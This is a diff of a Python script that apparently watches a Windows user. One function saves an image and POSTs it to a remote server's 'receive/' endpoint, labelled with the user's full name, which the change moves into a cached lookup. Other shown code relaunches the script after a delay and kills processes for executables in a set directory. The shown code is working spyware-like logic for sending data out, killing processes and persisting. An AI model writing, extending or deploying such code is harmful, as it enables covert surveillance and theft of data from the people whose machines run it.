@@ -1,7 +1,6 @@
 import os.path, subprocess, glob, time, signal, sys, threading, multiprocessing
 import urllib.request as r
-import urllib.error, hashlib, hmac, base64, getpass
-
+import urllib.error, hashlib, hmac, base64, getpass, functools
 
 def restartafterdelay(t, file=__file__):
     subprocess.run("python -c \"import time, subprocess; file2 = "+ascii(file)+"; time.sleep("+str(t)+"); subprocess.run(f\\\"python \\\\\\\"{file2}\\\\\\\"\\\")\" & pause")
@@ -34,7 +33,7 @@ def a():
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
         with open('tmp.png', 'rb') as imgbytes:
-            request(u+'receive/'+blahj, imgbytes.read(), 'POST')
+            request(u+'receive/'+b(), imgbytes.read(), 'POST')
     except Exception as e:
         pass
     finally:
@@ -107,6 +106,11 @@ def f2_old():
            usednames.append(x)
            #print(usednames)
 
+
+@functools.cache
+def b():
+    return c.Win32_UserAccount(name=getpass.getuser())[0].FullName
+
 def f():
     for x in glob.iglob(dynodir+r"\*.exe"):
         x = os.path.split(x)[1]
@@ -118,7 +122,6 @@ def f():
                 print('*bonk*', process.name)
             except Exception as e:
                 print(process.name)
-blahj = c.Win32_UserAccount(name=getpass.getuser())[0].FullName
 
 
 def f2():
